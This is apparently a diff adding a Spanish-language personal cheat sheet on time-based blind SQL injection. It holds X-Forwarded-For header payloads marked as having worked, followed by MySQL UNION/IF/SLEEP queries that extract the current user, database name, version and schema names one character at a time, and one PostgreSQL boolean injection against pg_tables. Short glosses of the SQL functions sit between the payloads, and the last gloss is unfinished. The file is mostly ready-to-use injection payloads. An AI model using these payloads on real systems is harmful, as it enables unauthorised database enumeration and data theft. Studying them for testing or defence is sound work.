@@ -1,0 +1,66 @@
+INYECCIÓN SQL A CIEGAS BASADA EN EL TIEMPO:
+
+X-Forwarded-For:12345" AND SLEEP(10) AND " << funciono
+X-Forwarded-For:12345" UNION SELECT IF(LENGTH(USER()) > 15, SLEEP(10), NULL) AND " << funciono
+
+
+Encabezado:12345"AND inyecion_consulta AND" >> patron
+
+Encabezado:12345"UNION inyecion_consulta AND" >> patron
+
+-------------------------------------------------
+a- UNION
+
+b- AND
+-------------------------------------------------
+
+CONSULTA 1:
+
+SELECT IF(LENGTH(USER()) > 15, SLEEP(10), NULL) 
+
+-------------------------------------------------
+a- IF(condicion, verdad, falso) >> if, else
+
+b- LENGTH() >> numero de caracteres
+
+c- USER() >> usuario actual
+
+d- SLEEP() >> pausar
+-------------------------------------------------
+
+CONSULTA 2:
+
+UNION SELECT IF(substr(DATABASE(),1,1)='a', SLEEP(10), NULL) AND
+-------------------------------------------------
+
+-------------------------------------------------
+
+
+UNION SELECT IF(substr(VERSION(),1,1)='5', SLEEP(10), NULL) AND 
+
+UNION SELECT IF(LENGTH((SELECT CAST((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 0,1) AS CHAR))) > 15, SLEEP(10), NULL) AND
+
+UNION SELECT IF(substr((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 0,1),1,1) = 'i', SLEEP(10), NULL) AND
+
+UNION SELECT IF(LENGTH((SELECT CAST((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 1,1) AS CHAR))) > 15, SLEEP(10), NULL) AND
+
+UNION SELECT IF(substr((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 1,1),1,1) = 'a', SLEEP(10), NULL) AND
+
+UNION SELECT IF(LENGTH((SELECT CAST((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 2,1) AS CHAR))) > 15, SLEEP(10), NULL) AND
+
+UNION SELECT IF(substr((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 2,1),1,1) = 'a', SLEEP(10), NULL) AND
+
+UNION SELECT IF(LENGTH((SELECT CAST((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 3,1) AS CHAR))) > 15, SLEEP(10), NULL) AND
+
+UNION SELECT IF(substr((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 3,1),1,1) = 'a', SLEEP(10), NULL) AND
+
+-------------------------------------------------
+POSTGRESQL
+-------------------------------------------------
+
+' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(DISTINCT(schemaname)) AS CHARACTER(10000)),(CHR(32))) FROM pg_tables)::text FROM 1 FOR 1))>51 AND 'JmcG'='JmcG
+
+-------------------------------------------------
+
+a- ASCII() >> 
+
